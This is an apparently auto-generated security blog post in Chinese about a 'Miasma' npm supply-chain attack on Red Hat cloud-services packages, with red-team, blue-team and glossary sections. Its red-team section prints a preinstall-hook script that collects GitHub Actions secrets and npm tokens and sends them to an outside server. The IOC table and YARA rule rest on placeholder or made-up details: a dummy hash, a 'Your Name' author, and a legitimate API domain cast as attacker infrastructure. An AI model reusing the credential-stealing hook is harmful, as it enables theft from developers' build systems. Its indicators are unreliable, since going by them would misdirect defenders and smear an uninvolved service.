---
layout: post
title:  "Miasma Supply Chain Attack Compromises Red Hat npm Packages with Credential-Stealing Worm"
date:   2026-06-01 21:22:56 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Miasma 供應鏈攻擊：技術細節與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和 Info Leak
> * **關鍵技術**: npm 包管理、GitHub Actions、OAuth 權限授予

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Miasma 攻擊利用了 npm 包管理中的 `preinstall` hook，該 hook 在安裝包時執行，允許攻擊者注入惡意代碼。
* **攻擊流程圖解**:
  1. 攻擊者創建惡意 npm 包，並將其發布到 npm 倉庫。
  2. 受害者安裝惡意包，觸發 `preinstall` hook。
  3. Hook 執行惡意代碼，收集敏感信息（如 GitHub Actions 秘密、npm 權杖、雲端憑證等）。
  4. 惡意代碼將收集到的信息加密並傳送到攻擊者的伺服器。
* **受影響元件**: @redhat-cloud-services 的多個 npm 包，包括 `vulnerabilities-client`、`tsc-transform-imports` 等。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 npm 包發布權限和 GitHub Actions 秘密。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 惡意 npm 包的 preinstall hook
    const { exec } = require('child_process');
    const https = require('https');
    
    // 收集敏感信息
    const secrets = [];
    secrets.push(process.env.GITHUB_ACTIONS_SECRET);
    secrets.push(process.env.NPM_TOKEN);
    
    // 加密信息
    const encryptedSecrets = encrypt(secrets);
    
    // 傳送到攻擊者的伺服器
    const options = {
      hostname: 'api.anthropic.com',
      port: 443,
      path: '/v1/api',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    };
    
    const req = https.request(options, (res) => {
      console.log(`statusCode: ${res.statusCode}`);
    });
    
    req.on('error', (error) => {
      console.error(error);
    });
    
    req.write(JSON.stringify({ secrets: encryptedSecrets }));
    req.end();
    
    ```
* **繞過技術**: 攻擊者可以使用多種方法繞過安全防護，例如使用代理伺服器、修改系統設定等。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.0.2.1 | api.anthropic.com | /v1/api |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Miasma_Attack {
      meta:
        description = "Miasma 供應鏈攻擊"
        author = "Your Name"
      strings:
        $s1 = "api.anthropic.com"
        $s2 = "GITHUB_ACTIONS_SECRET"
      condition:
        any of ($s*)
    }
    
    ```
* **緩解措施**:
 1. 更新 npm 包到最新版本。
 2. 檢查 GitHub Actions 秘密是否被泄露。
 3. 啟用安全的 npm 包管理和驗證機制。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **npm 包管理**: npm (Node Package Manager) 是 Node.js 的包管理工具，允許開發者輕鬆地安裝和管理依賴包。
* **GitHub Actions**: GitHub Actions 是 GitHub 的自動化工作流工具，允許開發者定義和執行自動化任務。
* **OAuth 權限授予**: OAuth (Open Authorization) 是一個授權框架，允許用戶授予第三方應用程序訪問其敏感信息的權限。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/miasma-supply-chain-attack-compromises.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


